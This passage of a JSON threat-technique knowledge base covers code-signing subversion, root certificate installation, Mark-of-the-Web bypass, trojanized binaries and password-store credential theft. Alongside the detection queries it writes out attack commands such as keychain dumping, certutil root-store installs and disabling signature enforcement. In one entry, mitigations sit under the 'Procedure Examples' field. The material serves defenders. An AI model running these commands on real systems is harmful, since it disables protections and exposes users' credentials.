      "Troll Stealer, along with its associated dropper, utilizes legitimate, stolen code signing certificates.[39][83]",
      "Winnti Groupused stolen certificates to sign its malware.[84]",
      "Wizard Spiderhas used Digicert code-signing certificates for some of its malware.[85]",
      "ZeroClearecan deploy a vulnerable, signed driver on a compromised host to bypass operating system safeguards.[86]"
    ]
  },
  "T1553.003": {
    "Name": "Subvert Trust Controls:SIP and Trust Provider Hijacking",
    "Description": "Adversaries may tamper with SIP and trust provider components to mislead the operating system and application control tools when conducting signature validation checks. In user mode, Windows Authenticode[1]digital signatures are used to verify a file's origin and integrity, variables that may be used to establish trust in signed code (ex: a driver with a valid Microsoft signature may be handled as safe). The signature validation process is handled via the WinVerifyTrust application programming interface (API) function,[2]which accepts an inquiry and coordinates with the appropriate trust provider, which is responsible for validating parameters of a signature.[3]Because of the varying executable file types and corresponding signature formats, Microsoft created software components called Subject Interface Packages (SIPs)[4]to provide a layer of abstraction between API functions and files. SIPs are responsible for enabling API functions to create, retrieve, calculate, and verify signatures. Unique SIPs exist for most file formats (Executable, PowerShell, Installer, etc., with catalog signing providing a catch-all[5]) and are identified by globally unique identifiers (GUIDs).[3]Similar toCode Signing, adversaries may abuse this architecture to subvert trust controls and bypass security policies that allow only legitimately signed code to execute on a system. Adversaries may hijack SIP and trust provider components to mislead operating system and application control tools to classify malicious (or any) code as signed by:[3]Modifying theDllandFuncNameRegistry values inHKLM\\SOFTWARE[\\WOW6432Node]Microsoft\\Cryptography\\OID\\EncodingType 0\\CryptSIPDllGetSignedDataMsg{SIP_GUID}that point to the dynamic link library (DLL) providing a SIP’s CryptSIPDllGetSignedDataMsg function, which retrieves an encoded digital certificate from a signed file. By pointing to a maliciously-crafted DLL with an exported function that always returns a known good signature value (ex: a Microsoft signature for Portable Executables) rather than the file’s real signature, an adversary can apply an acceptable signature value to all files using that SIP[6](although a hash mismatch will likely occur, invalidating the signature, since the hash returned by the function will not match the value computed from the file).Modifying theDllandFuncNameRegistry values inHKLM\\SOFTWARE[WOW6432Node]Microsoft\\Cryptography\\OID\\EncodingType 0\\CryptSIPDllVerifyIndirectData{SIP_GUID}that point to the DLL providing a SIP’s CryptSIPDllVerifyIndirectData function, which validates a file’s computed hash against the signed hash value. By pointing to a maliciously-crafted DLL with an exported function that always returns TRUE (indicating that the validation was successful), an adversary can successfully validate any file (with a legitimate signature) using that SIP[6](with or without hijacking the previously mentioned CryptSIPDllGetSignedDataMsg function). This Registry value could also be redirected to a suitable exported function from an already present DLL, avoiding the requirement to drop and execute a new file on disk.Modifying theDLLandFunctionRegistry values inHKLM\\SOFTWARE[WOW6432Node]Microsoft\\Cryptography\\Providers\\Trust\\FinalPolicy{trust provider GUID}that point to the DLL providing a trust provider’s FinalPolicy function, which is where the decoded and parsed signature is checked and the majority of trust decisions are made. Similar to hijacking SIP’s CryptSIPDllVerifyIndirectData function, this value can be redirected to a suitable exported function from an already present DLL or a maliciously-crafted DLL (though the implementation of a trust provider is complex).Note:The above hijacks are also possible without modifying the Registry viaDLLsearch order hijacking.Hijacking SIP or trust provider components can also enable persistent code execution, since these malicious components may be invoked by any application that performs code signing or signature validation.[3]",
    "Detects": [
      "Periodically baseline registered SIPs and trust providers (Registry entries and files on disk), specifically looking for new, modified, or non-Microsoft entries.[3]Also analyze Autoruns data for oddities and anomalies, specifically malicious files attempting persistent execution by hiding within auto-starting locations. Autoruns will hide entries signed by Microsoft or Windows by default, so ensure \"Hide Microsoft Entries\" and \"Hide Windows Entries\" are both deselected.[3]",
      "Enable CryptoAPI v2 (CAPI) event logging[7]to monitor and analyze error events related to failed trust validation (Event ID 81, though this event can be subverted by hijacked trust provider components) as well as any other provided information events (ex: successful validations). Code Integrity event logging may also provide valuable indicators of malicious SIP or trust provider loads, since protected processes that attempt to load a maliciously-crafted trust validation component will likely fail (Event ID 3033).[3]",
      "Enable the Registry Global Object Access Auditing[8]setting in the Advanced Security Audit policy to apply a global system access control list (SACL) and event auditing on modifications to Registry values (sub)keys related to SIPs and trust providers:[9]*HKLM\\SOFTWARE\\Microsoft\\Cryptography\\OID*HKLM\\SOFTWARE\\WOW6432Node\\Microsoft\\Cryptography\\OID*HKLM\\SOFTWARE\\Microsoft\\Cryptography\\Providers\\Trust*HKLM\\SOFTWARE\\WOW6432Node\\Microsoft\\Cryptography\\Providers\\TrustNote:As part of this technique, adversaries may attempt to manually edit these Registry keys (ex: Regedit) or utilize the legitimate registration process usingRegsvr32.[3]Periodically baseline registered SIPs and trust providers (Registry entries and files on disk), specifically looking for new, modified, or non-Microsoft entries.[3]"
    ],
    "Procedure Examples": [
      "Enable application control solutions such as AppLocker and/or Device Guard to block the loading of malicious SIP DLLs.",
      "Restrict storage and execution of SIP DLLs to protected directories, such as C:\\Windows, rather than user directories.",
      "Ensure proper permissions are set for Registry hives to prevent users from modifying keys related to SIP and trust provider components. Components may still be able to be hijacked to suitable functions already present on disk if malicious modifications to Registry keys are not prevented."
    ]
  },
  "T1553.004": {
    "Name": "Subvert Trust Controls:Install Root Certificate",
    "Description": "Adversaries may install a root certificate on a compromised system to avoid warnings when connecting to adversary controlled web servers. Root certificates are used in public key cryptography to identify a root certificate authority (CA). When a root certificate is installed, the system or application will trust certificates in the root's chain of trust that have been signed by the root certificate.[1]Certificates are commonly used for establishing secure TLS/SSL communications within a web browser. When a user attempts to browse a website that presents a certificate that is not trusted an error message will be displayed to warn the user of the security risk. Depending on the security settings, the browser may not allow the user to establish a connection to the website.Installation of a root certificate on a compromised system would give an adversary a way to degrade the security of that system. Adversaries have used this technique to avoid security warnings prompting users when compromised systems connect over HTTPS to adversary controlled web servers that spoof legitimate websites in order to collect login credentials.[2]Atypical root certificates have also been pre-installed on systems by the manufacturer or in the software supply chain and were used in conjunction with malware/adware to provideAdversary-in-the-Middlecapability for intercepting information transmitted over secure TLS/SSL communications.[3]Root certificates (and their associated chains) can also be cloned and reinstalled. Cloned certificate chains will carry many of the same metadata characteristics of the source and can be used to sign malicious code that may then bypass signature validation tools (ex: Sysinternals, antivirus, etc.) used to block execution and/or uncover artifacts of Persistence.[4]In macOS, the Ay MaMi malware uses/usr/bin/security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain /path/to/malicious/certto install a malicious certificate as a trusted root certificate into the system keychain.[5]",
    "Detects": [
      "Monitor for commands, such assecurity add-trusted-cert(macOS) orcertutil -addstore(Windows), that can be used to install root certificates. A system's root certificates are unlikely to change frequently. Monitor new certificates installed on a system that could be due to malicious activity.[4]Check pre-installed certificates on new systems to ensure unnecessary or suspicious certificates are not present. Microsoft provides a list of trustworthy root certificates online and throughauthroot.stl.[4]The Sysinternals Sigcheck utility can also be used (sigcheck[64].exe -tuv) to dump the contents of the certificate store and list valid certificates not rooted to the Microsoft Certificate Trust List.[13]",
      "Monitor for processes, such ascertmgr.exe(macOS) orcertutil.exe(Windows), that can be used to install root certificates. A system's root certificates are unlikely to change frequently. Monitor new certificates installed on a system that could be due to malicious activity.[4]Check pre-installed certificates on new systems to ensure unnecessary or suspicious certificates are not present. Microsoft provides a list of trustworthy root certificates online and throughauthroot.stl.[4]The Sysinternals Sigcheck utility can also be used (sigcheck[64].exe -tuv) to dump the contents of the certificate store and list valid certificates not rooted to the Microsoft Certificate Trust List.[13]Analytic 1 - Attempt to Add Certificate to Untrusted Store(source=\"WinEventLog:Microsoft-Windows-Sysmon/Operational\" EventCode=\"1\") OR (source=\"WinEventLog:Security\" EventCode=\"4688\") AND Image=\"C:\\Windows\\System32\\certutil.exe\" CommandLine=\"-addstore\"",
      "Monitoring the creation of (sub)keys within the Windows Registry may reveal malicious root certificate installation. Installed root certificates are located in the Registry underHKLM\\SOFTWARE\\Microsoft\\EnterpriseCertificates\\Root\\Certificates\\andHKLM\\SOFTWARE\\Microsoft\\SystemCertificates\\Root\\Certificates\\orHKCU\\Policies\\Microsoft\\SystemCertificates\\Root\\Certificates\\There are a subset of root certificates that are consistent across Windows systems and can be used for comparison:[14]* 18F7C1FCC3090203FD5BAA2F861A754976C8DD25* 245C97DF7514E7CF2DF8BE72AE957B9E04741E85* 3B1EFD3A66EA28B16697394703A72CA340A05BD5* 7F88CD7223F3C813818C994614A89C99FA3B5247* 8F43288AD272F3103B6FB1428485EA3014C0BCFE* A43489159A520F0D93D032CCAF37E7FE20A8B419* BE36A4562FB2EE05DBB3D32323ADF445084ED656* CDD4EEAE6000AC7F40C3802C171E30148030C072",
      "Monitoring changes to the Windows Registry may reveal malicious root certificate installation. Installed root certificates are located in the Registry underHKLM\\SOFTWARE\\Microsoft\\EnterpriseCertificates\\Root\\Certificates\\andHKLM\\SOFTWARE\\Microsoft\\SystemCertificates\\Root\\Certificates\\orHKCU\\Policies\\Microsoft\\SystemCertificates\\Root\\Certificates\\.There are a subset of root certificates that are consistent across Windows systems and can be used for comparison:[14]* 18F7C1FCC3090203FD5BAA2F861A754976C8DD25* 245C97DF7514E7CF2DF8BE72AE957B9E04741E85* 3B1EFD3A66EA28B16697394703A72CA340A05BD5* 7F88CD7223F3C813818C994614A89C99FA3B5247* 8F43288AD272F3103B6FB1428485EA3014C0BCFE* A43489159A520F0D93D032CCAF37E7FE20A8B419* BE36A4562FB2EE05DBB3D32323ADF445084ED656* CDD4EEAE6000AC7F40C3802C171E30148030C072"
    ],
    "Procedure Examples": [
      "certutilcan be used to install browser root certificates as a precursor to performingAdversary-in-the-Middlebetween connections to banking websites. Example command:certutil -addstore -f -user ROOT ProgramData\\cert512121.der.[6]",
      "Dokinstalls a root certificate to aid inAdversary-in-the-Middleactions using the commandadd-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain /tmp/filename.[7][8]",
      "Hikitinstalls a self-generated certificate to the local trust store as a root CA and Trusted Publisher.[9]",
      "RTMcan add a certificate to the Windows store.[10][11]"
    ]
  },
  "T1553.005": {
    "Name": "Subvert Trust Controls:Mark-of-the-Web Bypass",
    "Description": "Adversaries may abuse specific file formats to subvert Mark-of-the-Web (MOTW) controls. In Windows, when files are downloaded from the Internet, they are tagged with a hidden NTFS Alternate Data Stream (ADS) namedZone.Identifierwith a specific value known as the MOTW.[1]Files that are tagged with MOTW are protected and cannot perform certain actions. For example, starting in MS Office 10, if a MS Office file has the MOTW, it will open in Protected View. Executables tagged with the MOTW will be processed by Windows Defender SmartScreen that compares files with an allowlist of well-known executables. If the file is not known/trusted, SmartScreen will prevent the execution and warn the user not to run it.[2][3][4]Adversaries may abuse container files such as compressed/archive (.arj, .gzip) and/or disk image (.iso, .vhd) file formats to deliver malicious payloads that may not be tagged with MOTW. Container files downloaded from the Internet will be marked with MOTW but the files within may not inherit the MOTW after the container files are extracted and/or mounted. MOTW is a NTFS feature and many container files do not support NTFS alternative data streams. After a container file is extracted and/or mounted, the files contained within them may be treated as local files on disk and run without protections.[2][3]",
    "Detects": [
      "Monitor compressed/archive and image files downloaded from the Internet as the contents may not be tagged with the MOTW. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities.",
      "Monitor files (especially those downloaded from untrusted locations) for MOTW attributes. Also consider inspecting and scanning file formats commonly abused to bypass MOTW (ex: .arj, .gzip, .iso, .vhd)."
    ],
    "Procedure Examples": [
      "Amadeyhas modified the:Zone.Identifierin the ADS area to zero.[5]",
      "APT29has embedded ISO images and VHDX files in HTML to evade Mark-of-the-Web.[6]",
      "APT38has used ISO and VHD files to deploy malware and to bypass Mark-of-the-Web (MOTW) security measures.[7]",
      "QakBothas been packaged in ISO files in order to bypass Mark of the Web (MOTW) security measures.[8]",
      "TA505has used .iso files to deploy malicious .lnk files.[9]"
    ]
  },
  "T1553.006": {
    "Name": "Subvert Trust Controls:Code Signing Policy Modification",
    "Description": "Adversaries may modify code signing policies to enable execution of unsigned or self-signed code. Code signing provides a level of authenticity on a program from a developer and a guarantee that the program has not been tampered with. Security controls can include enforcement mechanisms to ensure that only valid, signed code can be run on an operating system.Some of these security controls may be enabled by default, such as Driver Signature Enforcement (DSE) on Windows or System Integrity Protection (SIP) on macOS.[1][2]Other such controls may be disabled by default but are configurable through application controls, such as only allowing signed Dynamic-Link Libraries (DLLs) to execute on a system. Since it can be useful for developers to modify default signature enforcement policies during the development and testing of applications, disabling of these features may be possible with elevated permissions.[3][2]Adversaries may modify code signing policies in a number of ways, including through use of command-line or GUI utilities,Modify Registry, rebooting the computer in a debug/recovery mode, or by altering the value of variables in kernel memory.[4][2][5][6]Examples of commands that can modify the code signing policy of a system includebcdedit.exe -set TESTSIGNING ONon Windows andcsrutil disableon macOS.[4][2]Depending on the implementation, successful modification of a signing policy may require reboot of the compromised system. Additionally, some implementations can introduce visible artifacts for the user (ex: a watermark in the corner of the screen stating the system is in Test Mode). Adversaries may attempt to remove such artifacts.[7]To gain access to kernel memory to modify variables related to signature checks, such as modifyingg_CiOptionsto disable Driver Signature Enforcement, adversaries may conductExploitation for Privilege Escalationusing a signed, but vulnerable driver.[8][6]",
    "Detects": [
      "Monitor for the execution of commands that could modify the code signing policy of a system, such asbcdedit.exe -set TESTSIGNING ON.[4]",
      "Monitor processes and command-line arguments for actions that could be taken to modify the code signing policy of a system, such asbcdedit.exe -set TESTSIGNING ON.[4]",
      "Consider monitoring for modifications made to Registry keys associated with code signing policies, such asHKCU\\Software\\Policies\\Microsoft\\Windows NT\\Driver Signing. Modifications to the code signing policy of a system are likely to be rare."
    ],
    "Procedure Examples": [
      "APT39has used malware to turn off theRequireSignedfeature which ensures only signed DLLs can be run on Windows.[9]",
      "BlackEnergyhas enabled theTESTSIGNINGboot configuration option to facilitate loading of a driver component.[7]",
      "Hikithas attempted to disable driver signing verification by tampering with several Registry keys prior to the loading of a rootkit driver component.[5]",
      "Pandoracan use CVE-2017-15303 to disable Windows Driver Signature Enforcement (DSE) protection and load its driver.[10]",
      "Turlahas modified variables in kernel memory to turn off Driver Signature Enforcement after exploiting vulnerabilities that obtained kernel mode privileges.[8][6]"
    ]
  },
  "T1554": {
    "Name": "Compromise Host Software Binary",
    "Description": "Adversaries may modify host software binaries to establish persistent access to systems. Software binaries/executables provide a wide range of system commands or services, programs, and libraries. Common software binaries are SSH clients, FTP clients, email clients, web browsers, and many other user or server applications.Adversaries may establish persistence though modifications to host software binaries. For example, an adversary may replace or otherwise infect a legitimate application binary (or support files) with a backdoor. Since these binaries may be routinely executed by applications or the user, the adversary can leverage this for persistent access to the host. An adversary may also modify a software binary such as an SSH client in order to persistently collect credentials during logins (i.e.,Modify Authentication Process).[1]An adversary may also modify an existing binary by patching in malicious functionality (e.g., IAT Hooking/Entry point patching)[2]prior to the binary’s legitimate execution. For example, an adversary may modify the entry point of a binary to point to malicious code patched in by the adversary before resuming normal execution flow.[3]After modifying a binary, an adversary may attempt toImpair Defensesby preventing it from updating (e.g., via theyum-versionlockcommand orversionlock.listfile in Linux systems that use the yum package manager).[1]",
    "Detects": [
      "Monitor for newly constructed files that may modify client software binaries to establish persistent access to systems.",
      "Monitor for unexpected deletion of  client software binaries to establish persistent access to systems.",
      "Collect and analyze signing certificate metadata and check signature validity on software that executes within the environment",
      "Monitor changes to client software that do not correlate with known software or patch cycles."
    ],
    "Procedure Examples": [
      "During the2016 Ukraine Electric Power Attack,Sandworm Teamused a trojanized version of Windows Notepad to add a layer of persistence forIndustroyer.[4]",
      "APT5has modified legitimate binaries and scripts for Pulse Secure VPNs including the legitimate DSUpgrade.pm file to install the ATRIUM webshell for persistence.[5][6]",
      "BFG Agonizeruses DLL unhooking to remove user mode inline hooks that security solutions often implement.BFG Agonizeralso uses IAT unhooking to remove user-mode IAT hooks that security solutions also use.[7]",
      "BOLDMOVEcontains a watchdog-like feature that monitors a particular file for modification. If modification is detected, the legitimate file is backed up and replaced with a trojanized file to allow for persistence through likely system upgrades.[8]",
      "Bonadanhas maliciously altered the OpenSSH binary on targeted systems to create a backdoor.[9]",
      "BUSHWALKcan embed into the legitimatequerymanifest.cgifile on compromised Ivanti Connect Secure VPNs.[10][11]",
      "DuringCutting Edge, threat actors trojanized legitimate files in Ivanti Connect Secure appliances with malicious code.[12][13][10]",
      "Eburymodifies thekeyutilslibrary to add malicious behavior to the OpenSSH client and the curl library.[14][15]",
      "FRAMESTINGcan embed itself in the CAV Python package of an Ivanti Connect Secure VPN located in/home/venv3/lib/python3.6/site-packages/cav-0.1-py3.6.egg/cav/api/resources/category.py.[10]",
      "Industroyerhas used a Trojanized version of the Windows Notepad application for an additional backdoor persistence mechanism.[4]",
      "Kesselhas maliciously altered the OpenSSH binary on targeted systems to create a backdoor.[9]",
      "Kobalosreplaced the SSH client with a trojanized SSH client to steal credentials on compromised systems.[16]",
      "LIGHTWIREcan imbed itself into the legitimatecompcheckresult.cgicomponent of Ivanti Connect Secure VPNs to enable command execution.[12][10]",
      "LITTLELAMB.WOOLTEAcan append malicious components to thetmp/tmpmnt/bin/samba_upgrade.tararchive inside the factory reset partition in attempt to persist post reset.[11]",
      "SLOWPULSEis applied in compromised environments through modifications to legitimate Pulse Secure files.[6]",
      "ThiefQuestsearches through the/Users/folder looking for executable files. For each executable,ThiefQuestprepends a copy of itself to the beginning of the file. When the file is executed, theThiefQuestcode is executed first.ThiefQuestcreates a hidden file, copies the original target executable to the file, then executes the new hidden file to maintain the appearance of normal behavior.[17][18]",
      "WARPWIREcan embed itself into a legitimate file on compromised Ivanti Connect Secure VPNs.[12]",
      "WIREFIREcan modify thevisits.pycomponent of Ivanti Connect Secure VPNs for file download and arbitrary command execution.[12][13]",
      "XCSSETuses a malicious browser application to replace the legitimate browser in order to continuously capture credentials, monitor web traffic, and download additional modules.[19]"
    ]
  },
  "T1555": {
    "Name": "Credentials from Password Stores",
    "Description": "Adversaries may search for common password storage locations to obtain user credentials.[1]Passwords are stored in several places on a system, depending on the operating system or application holding the credentials. There are also specific applications and services that store passwords to make them easier for users to manage and maintain, such as password managers and cloud secrets vaults. Once credentials are obtained, they can be used to perform lateral movement and access restricted information.",
    "Detects": [
      "Monitor for API calls and CLI commands that attempt to enumerate and fetch credential material from cloud secrets managers, such asget-secret-valuein AWS,gcloud secrets describein GCP, andaz key vault secret showin Azure. Alert on any suspicious usages of these commands, such as an account or service generating an unusually high number of secret requests.Analytic 1 - High volume of secret requests from unusual accounts or services.index=security sourcetype IN (\"aws:cloudtrail\", \"azure:activity\", \"gcp:activity\")(eventName IN (\"ListAccessKeys\", \"GetLoginProfile\", \"ListSecrets\", \"GetSecretValue\", \"GetParametersByPath\", \"ListKeys\") ORoperationName IN (\"ListAccessKeys\", \"GetLoginProfile\", \"ListSecrets\", \"GetSecretValue\", \"GetParametersByPath\", \"ListKeys\") ORprotoPayload.methodName IN (\"ListAccessKeys\", \"GetLoginProfile\", \"ListSecrets\", \"GetSecretValue\", \"GetParametersByPath\", \"ListKeys\"))",
      "Monitor executed commands and arguments that may search for common password storage locations to obtain user credentials.Analytic 1 - Commands indicating credential searches.(index=os sourcetype IN (\"Powershell\", \"linux_secure\", \"macos_secure\") CommandLine IN (\"findstr/si password\", \"findstr/si pass\", \"grep-r password\", \"grep-r pass\", \"grep-r secret\", \"securityfind-generic-password\", \"securityfind-internet-password\", \"securitydump-keychain\", \"gsettingsget org.gnome.crypto.cache\", \"cat/etc/shadow\", \"strings/etc/shadow\", \"ls -al~/.ssh/known_hosts\", \"ssh-add-L\"))",
      "Monitor for files being accessed that may search for common password storage locations to obtain user credentials.Analytic 1 - Unauthorized access to files containing credentials.index=security sourcetype IN (\"WinEventLog:Security\", \"WinEventLog:Microsoft-Windows-Sysmon/Operational\", \"linux_secure\", \"macos_secure\")((sourcetype=\"WinEventLog:Security\" EventCode=4663 ObjectName IN (\"passwords\", \"creds\", \"credentials\", \"secrets\")) OR (sourcetype=\"WinEventLog:Microsoft-Windows-Sysmon/Operational\" EventCode=11 TargetObject IN (\"passwords\", \"creds\", \"credentials\", \"secrets\")) OR (sourcetype=\"linux_secure\" action=\"open\" filepath IN (\"/etc/shadow\", \"/etc/passwd\", \"/.aws/credentials\", \"/.ssh/id_rsa\")) OR (sourcetype=\"macos_secure\" event_type=\"open\" file_path IN (\"/Library/Keychains/\", \"/Users//Library/Keychains/\", \"/Users//.ssh/id_rsa\")))",
      "Monitor for API calls that may search for common password storage locations to obtain user credentials.",
      "Monitor for processes being accessed that may search for common password storage locations to obtain user credentials.Analytic 1 - Unauthorized process access indicating credential searches.index=security sourcetype IN (\"WinEventLog:Microsoft-Windows-Sysmon/Operational\", \"linux_secure\", \"macos_secure\")(EventCode=10 TargetImage IN (\"lsass.exe\", \"securityd\", \"ssh-agent\", \"gpg-agent\") OR EventCode=11 TargetObject IN (\"password\", \"creds\", \"credentials\", \"secrets\", \"keychain\", \".kdbx\", \".pfx\", \".pem\", \".p12\", \".key\") OR EventCode=1 CommandLine IN (\"mimikatz\", \"procdump\", \"gcore\", \"dbxutil\", \"security find-generic-password\", \"security find-internet-password\", \"security dump-keychain\", \"gsettings get org.gnome.crypto.cache\"))",
      "Monitor newly executed processes that may search for common password storage locations to obtain user credentials.Analytic 1 - New processes with parameters indicating credential searches.index=security sourcetype IN (\"WinEventLog:Microsoft-Windows-Sysmon/Operational\", \"linux_secure\", \"macos_secure\")(EventCode=1 CommandLine IN (\"mimikatz\", \"procdump\", \"gcore\", \"dbxutil\", \"security find-generic-password\", \"security find-internet-password\", \"security dump-keychain\", \"gsettings get org.gnome.crypto.cache\", \"cat /etc/shadow\", \"strings /etc/shadow\", \"ls -al ~/.ssh/known_hosts\", \"ssh-add -L\"))"
    ],
    "Procedure Examples": [
      "Agent Teslahas the ability to steal credentials from FTP clients and wireless profiles.[2]",
      "APT33has used a variety of publicly available tools likeLaZagneto gather credentials.[3][4]",
      "APT39has used the Smartftp Password Decryptor tool to decrypt FTP passwords.[5]",
      "APT41has obtained information about accounts, lists of employees, and plaintext and hashed passwords from databases.[6]",
      "Astarothuses an external software known as NetPass to recover passwords.[7]",
      "Carberp's passw.plug plugin can gather account information from multiple instant messaging, email, and social media services, as well as FTP, VNC, and VPN clients.[8]",
      "CosmicDukecollects user credentials, including passwords, for various programs including popular instant messaging applications and email clients as well as WLAN keys.[1]",
      "DarkGateuse Nirsoft Network Password Recovery or NetPass tools to steal stored RDP credentials in some malware versions.[9]",
      "Evilnumcan collect email credentials from victims.[10]",
      "FIN6has used the Stealer One credential stealer to target e-mail and file transfer utilities including FTP.[11]",
      "HEXANEhas runcmdkeyon victim machines to identify stored credentials.[12]",
      "KGH_SPYcan collect credentials from WINSCP.[13]",
      "LaZagnecan obtain credentials from databases, mail, and WiFi across multiple platforms.[14]",
      "Leafminerused several tools for retrieving login and password information, including LaZagne.[15]",
      "Lokibothas stolen credentials from multiple applications and data sources including Windows OS credentials, email clients, FTP, and SFTP clients.[16]",
      "Malteirohas obtained credentials from mail clients via NirSoft MailPassView.[17]",
      "Manjusakaextracts credentials from the Windows Registry associated with Premiumsoft Navicat, a utility used to facilitate access to various database types.[18]",
      "Matryoshkais capable of stealing Outlook passwords.[19][20]",
      "MgBotincludes modules for stealing stored credentials from Outlook and Foxmail email client software.[21][22]",
      "Mimikatzperforms credential dumping to obtain account and password information useful in gaining access to additional systems and enterprise network resources. It contains functionality to acquire information about credentials in many ways, including from the credential vault and DPAPI.[23][24][25][26][27]",
      "Mispaduhas obtained credentials from mail clients via NirSoft MailPassView.[17][28][29]",
      "MuddyWaterhas performed credential dumping withLaZagneand other tools, including by dumping passwords saved in victim email.[30][31][32]",
      "NETWIREcan retrieve passwords from messaging and mail client applications.[33]",
      "OilRighas used credential dumping tools such asLaZagneto steal credentials to accounts logged into the compromised system and to Outlook Web Access.[34][35][36][37]",
      "OLDBAITcollects credentials from several email clients.[38]",
      "PinchDukesteals credentials from compromised hosts.PinchDuke's credential stealing functionality is believed to be based on the source code of the Pinch credential stealing malware (also known as LdPinch). Credentials targeted byPinchDukeinclude ones associated with many sources such as The Bat!, Yahoo!, Mail.ru, Passport.Net, Google Talk, and Microsoft Outlook.[1]",
      "PLEADhas the ability to steal saved passwords from Microsoft Outlook.[39]",
      "PoshC2can decrypt passwords stored in the RDCMan configuration file.[40]",
      "A module inPrikormkacollects passwords stored in applications installed on the victim.[41]",
      "Pupycan use Lazagne for harvesting credentials.[42]",
      "QuasarRATcan obtain passwords from common FTP clients.[43][44]",
      "During theSolarWinds Compromise,APT29used account credentials they obtained to attempt access to Group Managed Service Account (gMSA) passwords.[45]",
      "Stealth Falconmalware gathers passwords from multiple sources, including Windows Credential Vault and Outlook.[46]",
      "Volt Typhoonhas attempted to obtain credentials from OpenSSH, realvnc, and PuTTY.[47]",
      "XLoadercan collect credentials stored in email clients.[48][49]"
    ]
  },
  "T1555.001": {
    "Name": "Credentials from Password Stores:Keychain",
    "Description": "Adversaries may acquire credentials from Keychain. Keychain (or Keychain Services) is the macOS credential management system that stores account names, passwords, private keys, certificates, sensitive application data, payment data, and secure notes. There are three types of Keychains: Login Keychain, System Keychain, and Local Items (iCloud) Keychain. The default Keychain is the Login Keychain, which stores user passwords and information. The System Keychain stores items accessed by the operating system, such as items shared among users on a host. The Local Items (iCloud) Keychain is used for items synced with Apple’s iCloud service.Keychains can be viewed and edited through the Keychain Access application or using the command-line utilitysecurity. Keychain files are located in~/Library/Keychains/,/Library/Keychains/, and/Network/Library/Keychains/.[1][2][3]Adversaries may gather user credentials from Keychain storage/memory. For example, the commandsecurity dump-keychain –dwill dump all Login Keychain credentials from~/Library/Keychains/login.keychain-db. Adversaries may also directly read Login Keychain credentials from the~/Library/Keychains/login.keychainfile. Both methods require a password, where the default password for the Login Keychain is the current user’s password to login to the macOS host.[4][5]",
    "Detects": [
      "Monitor executed commands with arguments that may be used to collect Keychain data from a system to acquire credentials.Analytic 1 - Commands indicating credential searches in Keychain.index=security sourcetype=\"macos_secure\"(event_type=\"process\" AND (command IN (\"security dump-keychain\", \"security find-generic-password\", \"security find-internet-password\", \"security unlock-keychain\") OR  command IN (\"securitydump-keychain\", \"securityfind-generic-password\", \"securityfind-internet-password\", \"securityunlock-keychain\")))",
      "Monitor for Keychain files being accessed that may be related to malicious credential collection.Analytic 1 - Unauthorized access to Keychain files.index=security sourcetype=\"macos_secure\"(event_type=\"file_open\" AND file_path IN (\"~/Library/Keychains/\", \"/Library/Keychains/\", \"/Network/Library/Keychains/*\"))",
      "Monitor for Keychain Services API calls, specifically legacy extensions such asSecKeychainFindInternetPassword, that may collect Keychain data from a system to acquire credentials.[15]Analytic 1 - Suspicious Keychain API calls.index=security sourcetype=\"macos_secure\"(event_type=\"api_call\" AND api IN (\"SecKeychainCopySearchList\", \"SecKeychainFindGenericPassword\", \"SecKeychainFindInternetPassword\", \"SecKeychainOpen\", \"SecKeychainCopyDefault\", \"SecItemCopyMatching\"))",
      "Monitor processes spawned by command line utilities to manipulate keychains directly, such assecurity, combined with arguments to collect passwords, such asdump-keychain -d.Analytic 1 - New processes with parameters indicating attempts to manipulate keychains.index=security sourcetype=\"macos_secure\" event_type=\"process\"(CommandLine IN (\"security dump-keychain\", \"security find-generic-password\", \"security find-internet-password\", \"security unlock-keychain\", \"security delete-keychain\", \"security set-keychain-settings\", \"security add-internet-password\", \"security add-generic-password\", \"security import\", \"security export\"))"
    ],
    "Procedure Examples": [
      "Calistocollects Keychain storage data and copies those passwords/tokens to a file.[6][7]",
      "Cuckoo Stealercan capture files from a targeted user's keychain directory.[8]",
      "Green Lambertcan use Keychain Services API functions to find and collect passwords, such asSecKeychainFindInternetPasswordandSecKeychainItemCopyAttributesAndData.[9][10]",
      "iKittencollects the keychains on the system.[11]",
      "LaZagnecan obtain credentials from macOS Keychains.[12]",
      "LightSpyperforms an in-memory keychain query viaSecItemCopyMatching()then formats the retrieved data as a JSON blob for exfiltration.[13]",
      "MacMacan dump credentials from the macOS keychain.[14]",
      "Protongathers credentials in files for keychains.[11]"
    ]
  },
  "T1555.002": {
    "Name": "Credentials from Password Stores:Securityd Memory",
    "Description": "An adversary with root access may gather credentials by readingsecurityd’s memory.securitydis a service/daemon responsible for implementing security protocols such as encryption and authorization.[1]A privileged adversary may be able to scan throughsecurityd's memory to find the correct sequence of keys to decrypt the user’s logon keychain. This may provide the adversary with various plaintext passwords, such as those for users, WiFi, mail, browsers, certificates, secure notes, etc.[2][3]In OS X prior to El Capitan, users with root access can read plaintext keychain passwords of logged-in users because Apple’s keychain implementation allows these credentials to be cached so that users are not repeatedly prompted for passwords.[2][4]Apple’ssecuritydutility takes the user’s logon password, encrypts it with PBKDF2, and stores this master key in memory. Apple also uses a set of keys and algorithms to encrypt the user’s password, but once the master key is found, an adversary need only iterate over the other values to unlock the final password.[2]",
    "Detects": [
      "Monitor executed commands and arguments that may obtain root access (allowing them to read securityd’s memory), then they can scan through memory to find the correct sequence of keys in relatively few tries to decrypt the user’s logon keychain.Analytic 1 - Commands indicating attempts to read securityd’s memory.index=security sourcetype IN (\"linux_secure\", \"macos_secure\") event_type=\"process\"(CommandLine IN (\"gcore\", \"dbxutil\", \"vmmap\", \"gdb\", \"lldb\", \"memdump\", \"strings\", \"cat /proc//maps\", \"grep /proc//maps\") OR CommandLine IN (\"security find-generic-password\", \"security find-internet-password\", \"security dump-keychain\"))",
      "Monitor for processes being accessed that may obtain root access (allowing them to read securityd’s memory), then they can scan through memory to find the correct sequence of keys in relatively few tries to decrypt the user’s logon keychain.Analytic 1 - Unauthorized process access indicating attempts to read securityd’s memory.index=security sourcetype IN (\"linux_secure\", \"macos_secure\") event_type=\"process\"(CommandLine IN (\"gcore\", \"dbxutil\", \"vmmap\", \"gdb\", \"lldb\", \"memdump\", \"strings\", \"cat /proc//maps\", \"grep /proc//maps\") OR (CommandLine IN (\"securityd\" AND CommandLine IN (\"ps\", \"lsof\", \"pmap\")))"
    ],
    "Procedure Examples": [
      "Keydnapuses the keychaindump project to read securityd memory.[5]"
    ]
  },
